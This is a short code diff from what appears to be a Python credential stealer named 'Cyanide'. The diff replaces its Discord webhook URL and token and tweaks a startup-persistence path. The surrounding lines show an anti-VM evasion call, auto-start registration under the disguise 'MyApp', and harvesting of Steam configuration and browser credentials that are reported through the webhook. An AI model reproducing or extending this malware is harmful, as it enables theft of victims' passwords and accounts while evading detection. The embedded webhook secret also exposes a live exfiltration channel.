@@ -15,7 +15,7 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 
 class Main:
     def __init__(self) -> None:
-        self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
+        self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1055165134210867320/aLmPra2429Hh2dkZ6yejxXR69yuHGmpZNxjb3D2kBTQ2Amie_B1wMPdPSHSX1nYQS-TK', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
 
     def antivm(self):
         antivm.Antivm.run()
@@ -115,7 +115,7 @@ class Main:
 
     def run(self):
         Thread(target=self.antivm).start()
-        self.addStartup("MyApp", os.path.abspath(os.path.dirname(__file__)))
+        self.addStartup("MyApp", os.path.abspath(os.path.dirname(__name__)))
         
         userConfig, steamConfig = self.steam()
         listCreds = self.browser()
